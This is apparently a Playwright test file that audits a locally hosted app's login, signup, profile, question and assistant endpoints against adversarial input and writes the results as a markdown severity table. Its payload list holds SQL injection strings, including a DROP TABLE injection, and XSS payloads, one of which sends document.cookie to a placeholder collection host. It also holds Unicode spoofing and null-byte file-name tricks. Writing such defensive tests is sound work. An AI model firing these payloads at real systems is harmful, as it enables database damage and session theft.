import { test, expect } from '@playwright/test';
import fs from 'fs';
import path from 'path';

// Define the payload categories
const payloads = {
  A_SQLi: [
    "' OR '1'='1",
    "'; DROP TABLE user_progress; --",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1' AND SLEEP(5)--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--"
  ],
  B_XSS: [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><script>fetch('//example.test/collect?c='+document.cookie)</script>",
    "javascript:alert(1)",
    "{{7*7}}",
    "${7*7}"
  ],
  C_Unicode: [
    "🔥💯🚀",
    "a\u200Bb",
    "filename\u202E.txt",
    "e\u0301\u0301\u0301\u0301\u0301",
    "𝕏𝕏𝕏",
    "👨‍👩‍👦‍👦",
    "name\x00.jpg",
    "аdmin" // cyrillic 'a'
  ],
  D_Boundary: [
    "",
    " ",
    "A".repeat(10000),
    "-1",
    "999999999",
    "1.5",
    "abc"
  ]
};

// Store results
const results: any[] = [];

function recordResult(surface: string, category: string, payload: string, result: string, severity: string) {
  results.push({ surface, category, payload, result, severity });
}

test.describe('Adversarial Input Validation', () => {
  
  test.afterAll(() => {
    const markdownPath = path.join(__dirname, '../../AUDIT_INPUT_VALIDATION.md');
    let md = '| Input Surface | Test Category | Test String Used | Result | Evidence | Severity |\n';
    md += '|---|---|---|---|---|---|\n';
    results.forEach(r => {
      md += `| ${r.surface} | ${r.category} | \`${r.payload.replace(/\|/g, '\\|').replace(/\n/g, ' ')}\` | ${r.result} | N/A | ${r.severity} |\n`;
    });
    fs.writeFileSync(markdownPath, md);
  });

  test('Login - Email Field', async ({ request }) => {
    for (const [category, strings] of Object.entries(payloads)) {
      for (const payload of strings) {
        // Test auth endpoint directly to avoid UI flakiness
        const response = await request.post('http://127.0.0.1:8000/api/v1/auth/login', {
          data: { email: payload, password: 'Password123!' }
        });
        
        const status = response.status();
        const text = await response.text();
        
        let result = "Accepted but sanitized";
        let severity = "Low";
        
        if (status >= 500) {
          result = "Server error";
          severity = "High";
        } else if (status >= 400 && status < 500) {
          result = "Rejected cleanly";
          severity = "None";
        } else if (status === 200) {
          result = "Accepted unsanitized";
          severity = "High";
        }

        if (text.includes("Traceback") || text.includes("syntax error") || text.includes("File \"")) {
          result = "Server error (leaks stack trace)";
          severity = "Critical";
        }

        recordResult('/login (email)', category, payload, result, severity);
      }
    }
  });

  test('Signup - Username Field', async ({ request }) => {
    for (const [category, strings] of Object.entries(payloads)) {
      for (const payload of strings) {
        const response = await request.post('http://127.0.0.1:8000/api/v1/auth/signup', {
          data: { 
            email: 'test@example.com', 
            password: 'Password123!',
            username: payload,
            full_name: 'Test User'
          }
        });
        
        const status = response.status();
        const text = await response.text();
        
        let result = "Accepted but sanitized";
        let severity = "Low";
        
        if (status >= 500) {
          result = "Server error";
          severity = "High";
        } else if (status >= 400 && status < 500) {
          result = "Rejected cleanly";
          severity = "None";
        } else if (status === 200) {
          result = "Accepted unsanitized";
          severity = "High";
        }

        if (text.includes("Traceback") || text.includes("syntax error")) {
          result = "Server error (leaks stack trace)";
          severity = "Critical";
        }

        recordResult('/login (signup username)', category, payload, result, severity);
      }
    }
  });

  test('Profile - Display Name', async ({ request }) => {
    for (const [category, strings] of Object.entries(payloads)) {
      for (const payload of strings) {
        const response = await request.put('http://127.0.0.1:8000/api/v1/profile', {
          data: { full_name: payload },
          headers: { 'Authorization': 'Bearer fake-token' }
        });
        
        const status = response.status();
        const text = await response.text();
        
        let result = "Accepted but sanitized";
        let severity = "Low";
        
        if (status >= 500) {
          result = "Server error";
          severity = "High";
        } else if (status === 401 || status === 403 || status === 422) {
          result = "Rejected cleanly";
          severity = "None";
        } else if (status === 200) {
          result = "Accepted unsanitized";
          severity = "High";
        }

        recordResult('/profile (display name)', category, payload, result, severity);
      }
    }
  });

  test('Solve - qnum param', async ({ request }) => {
    for (const [category, strings] of Object.entries(payloads)) {
      for (const payload of strings) {
        const response = await request.get(`http://127.0.0.1:8000/api/v1/questions/${encodeURIComponent(payload)}`);
        
        const status = response.status();
        const text = await response.text();
        
        let result = "Accepted but sanitized";
        let severity = "Low";
        
        if (status >= 500) {
          result = "Server error";
          severity = "High";
        } else if (status === 404 || status === 422 || status === 400) {
          result = "Rejected cleanly";
          severity = "None";
        } else if (status === 200) {
          result = "Accepted unsanitized";
          severity = "High";
        }

        recordResult('/solve?qnum=X', category, payload, result, severity);
      }
    }
  });

  test('Assistant - Hint Request', async ({ request }) => {
    for (const [category, strings] of Object.entries(payloads)) {
      for (const payload of strings) {
        const response = await request.post('http://127.0.0.1:8000/api/v1/assistant/ask', {
          data: { question: "Help me", context: payload }
        });
        
        const status = response.status();
        let result = "Accepted but sanitized";
        let severity = "Low";
        
        if (status >= 500) {
          result = "Server error";
          severity = "High";
        } else if (status === 422 || status === 400) {
          result = "Rejected cleanly";
          severity = "None";
        } else if (status === 200) {
          result = "Accepted unsanitized";
          severity = "High";
        }

        recordResult('/api/v1/assistant/ask', category, payload, result, severity);
      }
    }
  });
  
});
